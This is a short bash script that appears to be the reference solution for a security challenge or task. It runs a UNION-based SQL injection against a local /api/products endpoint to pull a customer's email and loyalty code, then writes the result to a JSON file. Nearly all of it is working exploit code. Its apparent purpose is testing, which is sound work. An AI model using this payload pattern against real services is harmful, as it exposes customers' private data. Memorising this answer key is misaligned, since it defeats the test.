#!/usr/bin/env bash
set -euo pipefail

# Ensure the local service is up (oracle path; harmless if already running).
python3 - <<'PY'
import time
import urllib.request
for _ in range(40):
    try:
        urllib.request.urlopen("http://127.0.0.1:8080/health", timeout=1)
        break
    except Exception:
        time.sleep(0.5)
else:
    raise SystemExit("service did not become healthy")
PY

python3 - <<'PY'
import json
import urllib.parse
import urllib.request
from pathlib import Path

# UNION-based payload. The vulnerable statement selects four columns
# (id, sku, name, price) from products. We mirror the column count and place
# the targeted loyalty_code into the third (name) slot so it surfaces in the
# JSON product list.
payload = (
    "x' UNION SELECT id, email, loyalty_code, 0 "
    "FROM customers WHERE display_name='VIP Concierge Desk' -- "
)
url = "http://127.0.0.1:8080/api/products?name=" + urllib.parse.quote(payload, safe="")
with urllib.request.urlopen(url, timeout=5) as resp:
    data = json.load(resp)

# The injected row surfaces with loyalty_code in the 'name' field.
extracted = None
for product in data.get("products", []):
    candidate = product.get("name", "")
    if isinstance(candidate, str) and candidate.startswith("LOY-"):
        extracted = candidate
        break

if extracted is None:
    raise SystemExit(f"loyalty_code not found in response: {data}")

result = {
    "loyalty_code": extracted,
    "owner": "VIP Concierge Desk",
    "injection_param": "name",
    "endpoint": "/api/products",
}
Path("/app/extracted_loyalty.json").write_text(json.dumps(result, indent=2) + "\n")
print(extracted)
PY
